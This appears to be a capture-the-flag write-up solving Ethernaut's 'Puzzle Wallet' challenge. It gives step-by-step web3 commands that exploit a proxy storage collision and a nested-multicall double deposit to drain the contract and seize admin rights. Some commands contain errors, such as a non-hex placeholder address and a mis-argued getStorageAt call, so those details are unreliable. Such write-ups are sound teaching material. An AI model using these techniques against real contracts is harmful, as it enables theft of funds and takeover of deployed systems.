# Solution to challenge 24 : Puzzle Wallet

Our goal here is to claim ownership of the PuzzleProxy contract. First we need to understand the Proxy structure of the challenge, the slot arrangement in both contracts should be the same because the slots are mapped. 

As a result, when the proxy contract makes a call to the implementation contract, the proxy's storage variables are modified and the call is made in the context of the proxy.

```
SLOT    PuzzleProxy   |  PuzzleWallet
----------------------------------------------------------------------------------
0       pendingAdmin     owner

1       admin            maxBalance
```        

This means that if we change the value of `pendingAdmin` in ``PuzzleProxy`` contract , the `owner` value will be changed in `PuzzleWallet` contract.

So let's think about our objective : change `admin` value in `PuzzleProxy` to player's address, there is no way to change it through ``PuzzleProxy``, so let's aim at changing `maxBalance` value which shares the "same storage slot".

### There are 2 ways to alter this value :

1. `init()` function : not exploitable because it **has already been initialized**
2. `setMaxBalance()` function : exploitable but we need the contract's balance to be equal to zero

![](https://github.com/Kuqow/ethernaut-solutions-Kuqow/blob/main/Pictures/puzzlewallet1.png)

Unfortunately, by default the contract's balance is equal to `0.001 ether` :

![](https://github.com/Kuqow/ethernaut-solutions-Kuqow/blob/main/Pictures/puzzlewallet2.png)

We can reduce its balance through `execute()` function which is equivalent to a withdraw function :

![](https://github.com/Kuqow/ethernaut-solutions-Kuqow/blob/main/Pictures/puzzlewallet3.png)

Sadly the contract keeps track of what we deposited, that's why we will need to use the last and most complex function available : `multicall()` 

![](https://github.com/Kuqow/ethernaut-solutions-Kuqow/blob/main/Pictures/puzzlewallet4.png)

This function allows us to execute multiple functions in 1 transaction. Thus, we can abuse of the fact that even if ETH is spent, `msg.value` will remain the same and take the opportunity to make a double call to the `deposit` function. The developers were aware of this exploitable issue and made a protection by checking the **selector** (first 4 bytes of the function signature).

But we can bypass this protection if we **"pack"** one deposit inside another `multicall`

## Let's sum up all the actions required together, we will only use web3 js commands :

### 1. Claim ownership of `PuzzleWallet` contract by changing `pendingAdmin` value to the player's address

We first calculate the signature of the `proposeNewAdmin` function :

```
web3.eth.abi.encodeFunctionSignature("proposeNewAdmin(address)");
'0xa6376746'
```

Then the signature of the parameter `address` with player's address : 

```
web3.eth.abi.encodeParameter("address", player);
'0x000000000000000000000000cabcdefghijkl123456123451234567123456789'
```

We put them together and send this transaction data :

```
contract.sendTransaction({ data: '0xa6376746000000000000000000000000cabcdefghijkl123456123451234567123456789' });
```

After that, the `owner`'s  value of `PuzzleWallet` is now your player's address.

### 2. Add our player's address to the whitelist in order to interact with the different functions

```
contract.addToWhitelist(player);
```

### 3. Prepare the data bytes required for the  ``multicall`` and `deposit` exploit, do not forget to include the parameters expected by the functions

``deposit()`` function signature :

```
deposit = web3.eth.abi.encodeFunctionSignature("deposit()");
'0xd0e30db0'
```

`multicall(bytes[])` function signature :

```
multicall = eb3.eth.abi.encodeFunctionSignature("multicall(bytes[])");
'0xac9650d8'
```

Signature of the `deposit` call as a  `multicall` parameter :

```
web3.eth.abi.encodeParameter('bytes[]', [deposit]);
'0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000';
```

Again, we add the `deposit` function signature  :

```
packedDeposit = '0xac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000';
```

### 4. Call `multicall` function with the prepared data bytes with a msg of at least ``0.001 ether``

```
contract.multicall([deposit, packedDeposit], { value: toWei('0.001') });
```

### 5. As a result, the contract has now a balance equal to `0.002 ether`, we called twice the deposit function and increased our "available balance" while only depositing `0.001 ether`

```
(await getBalance(instance)).toString();
'0.002'
```

### 6. We can now withdraw `0.002 ether` from the contract using `execute` function and make the contract's balance empty

```
contract.execute(player, toWei('0.002'), '123');
```

### 7. All the protections are now gone, we can now change `maxBalance` value to finally become the owner of the `PuzzleProxy` contract

```
contract.setMaxBalance('1116821831790595974849218070050646934865281521986');
```


## BONUS : Retrieve the address of the proxy's contract

Once we get our game instance, we only know the `PuzzleWallet` 's contract address. 

But according to **EIP-1967** : To avoid clashes in storage usage between the proxy and logic contract, the address of the logic contract is typically saved in a specific storage slot guaranteed to be never allocated by a compiler.

For OpenZeppelin's contracts it is at slot ``0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc``

As a result, we can get our address by getting the data at this specific storage slot :

`web3.eth.getStorageAt(instance,"0xcabcdefghijkl123456123451234567123456789")`

Source : https://eips.ethereum.org/EIPS/eip-1967